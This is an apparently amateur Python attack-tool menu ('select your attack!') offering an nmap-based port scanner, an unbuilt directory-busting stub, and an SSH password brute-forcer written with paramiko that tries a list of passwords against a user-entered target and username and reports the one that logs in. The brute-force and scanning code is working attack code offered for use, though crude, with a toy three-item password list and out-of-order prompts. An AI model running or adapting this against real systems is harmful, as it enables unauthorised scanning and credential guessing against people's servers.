#pip install paramiko
#import subprocess
#import argparse
#import os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print("""
████████╗██╗░░██╗███████╗  ███╗░░░███╗░█████╗░███╗░░██╗██╗░░██╗███████╗██╗░░░██╗  ███╗░░░███╗░█████╗░██████╗░███████╗
╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██╔══██╗████╗░██║██║░██╔╝██╔════╝╚██╗░██╔╝  ████╗░████║██╔══██╗██╔══██╗██╔════╝
░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░██║██╔██╗██║█████═╝░█████╗░░░╚████╔╝░  ██╔████╔██║███████║██║░░██║█████╗░░
░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░██║██║╚████║██╔═██╗░██╔══╝░░░░╚██╔╝░░  ██║╚██╔╝██║██╔══██║██║░░██║██╔══╝░░
░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚█████╔╝██║░╚███║██║░╚██╗███████╗░░░██║░░░  ██║░╚═╝░██║██║░░██║██████╔╝███████╗
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝░░░╚═╝░░░  ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝

░█████╗░██╗░░░██╗████████╗░█████╗░  ████████╗░█████╗░░█████╗░██╗░░░░░░░░
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░░░░
███████║██║░░░██║░░░██║░░░██║░░██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░░░░
██╔══██║██║░░░██║░░░██║░░░██║░░██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░░░░
██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗██╗
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═╝\n
                    Made By Tristan (MonkeyMapper)""")
print('select your attack!\n1: Port scanner\n2: DirBuster 3: BruteSSH')
user_selection = int(input())
if user_selection == 1:
     #!/usr/bin/env python3
    #Use these commands in Kali to install required software:
    #  sudo apt install python3-pip
    #  pip install python-nmap

    # Import nmap so we can use it for the scan
    import nmap
    # We need to create regular expressions to ensure that the input is correctly formatted.
    import re

    # Regular Expression Pattern to recognise IPv4 addresses.
    ip_add_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    # Regular Expression Pattern to extract the number of ports you want to scan. 
    # You have to specify <lowest_port_number>-<highest_port_number> (ex 10-100)
    port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
    # Initialising the port numbers, will be using the variables later on.
    port_min = 0
    port_max = 65535

    # This port scanner uses the Python nmap module.
    # You'll need to install the following to get it work on Linux:
    # Step 1: sudo apt install python3-pip
    # Step 2: pip install python-nmap


    # Basic user interface header
    print(r"""
    ███╗░░░███╗░█████╗░███╗░░██╗██╗░░██╗███████╗██╗░░░██╗  ███╗░░░███╗░█████╗░██████╗░██████╗░███████╗██████╗░
    ████╗░████║██╔══██╗████╗░██║██║░██╔╝██╔════╝╚██╗░██╔╝  ████╗░████║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
    ██╔████╔██║██║░░██║██╔██╗██║█████═╝░█████╗░░░╚████╔╝░  ██╔████╔██║███████║██████╔╝██████╔╝█████╗░░██████╔╝
    ██║╚██╔╝██║██║░░██║██║╚████║██╔═██╗░██╔══╝░░░░╚██╔╝░░  ██║╚██╔╝██║██╔══██║██╔═══╝░██╔═══╝░██╔══╝░░██╔══██╗
    ██║░╚═╝░██║╚█████╔╝██║░╚███║██║░╚██╗███████╗░░░██║░░░  ██║░╚═╝░██║██║░░██║██║░░░░░██║░░░░░███████╗██║░░██║
    ╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝░░░╚═╝░░░  ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝""")
    print("\n****************************************************************")
    print("\n* Copyright of Tristan Flores, 2024                              *")
    print("\n****************************************************************")

    open_ports = []
    # Ask user to input the ip address they want to scan.
    while True:
        ip_add_entered = input("\nPlease enter the ip address that you want to scan: ")
        if ip_add_pattern.search(ip_add_entered):
            print(f"{bcolors.OKBLUE}{ip_add_entered} is a valid ip address")
            break

    while True:
    # You can scan 0-65535 ports. This scanner is basic and doesn't use multithreading so scanning 
    # all the ports is not advised.
        print(f"{bcolors.OKGREEN}Please enter the range of ports you want to scan in format: <int>-<int> (ex would be 60-120)")
        port_range = input("Enter port range: ")
        port_range_valid = port_range_pattern.search(port_range.replace(" ",""))
        if port_range_valid:
            port_min = int(port_range_valid.group(1))
            port_max = int(port_range_valid.group(2))
            break

    nm = nmap.PortScanner()
    # We're looping over all of the ports in the specified range.
    for port in range(port_min, port_max + 1):
        try:
        # The result is quite interesting to look at. You may want to inspect the dictionary it returns. 
        # It contains what was sent to the command line in addition to the port status we're after. 
        # For in nmap for port 80 and ip 10.0.0.2 you'd run: nmap -oX - -p 89 -sV 10.0.0.2
            result = nm.scan(ip_add_entered, str(port))
        # Uncomment following line and look at dictionary
        # print(result)
        # We extract the port status from the returned object
            port_status = (result['scan'][ip_add_entered]['tcp'][port]['state'])
            if port_status == "open":
                print(f"Port {port} is {port_status}")

        except:
        # We cannot scan some ports and this ensures the program doesn't crash when we try to scan them.
            print(f"Cannot scan port {port}.")
elif user_selection == 2:
    #build Webcrawler!
    print("NOT YET BUILT BRO!!")

elif user_selection == 3:

    import paramiko
    print("""
    ██████╗░░█████╗░██████╗░░█████╗░███╗░░░███╗░█████╗░███╗░░██╗██╗░░██╗███████╗██╗░░░██╗
    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗████╗░██║██║░██╔╝██╔════╝╚██╗░██╔╝
    ██████╔╝███████║██████╔╝███████║██╔████╔██║██║░░██║██╔██╗██║█████═╝░█████╗░░░╚████╔╝░
    ██╔═══╝░██╔══██║██╔══██╗██╔══██║██║╚██╔╝██║██║░░██║██║╚████║██╔═██╗░██╔══╝░░░░╚██╔╝░░
    ██║░░░░░██║░░██║██║░░██║██║░░██║██║░╚═╝░██║╚█████╔╝██║░╚███║██║░╚██╗███████╗░░░██║░░░
    ╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝░░░╚═╝░░░\nWere Just Monkeying Around!!\n""")
    print("Please enter your target IP...")
    print("please enter your target Username...")
    print("Please enter your password list (Example: password_medium.txt)...")
    def ssh_brute_force(target, username, password_list):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for password in password_list:
            try: 
                ssh.connect(target, username=username, password=password)
                print(f'{bcolors.OKGREEN}Success! Username: {username}, Password: {password}')
                return
            except paramiko.AuthenticationException:
                print(f'Failed: {password}')

    target = input()
    username = input()
    password_list = [12345, 'Password', 'bananas']
    ssh_brute_force(target, username, password_list)
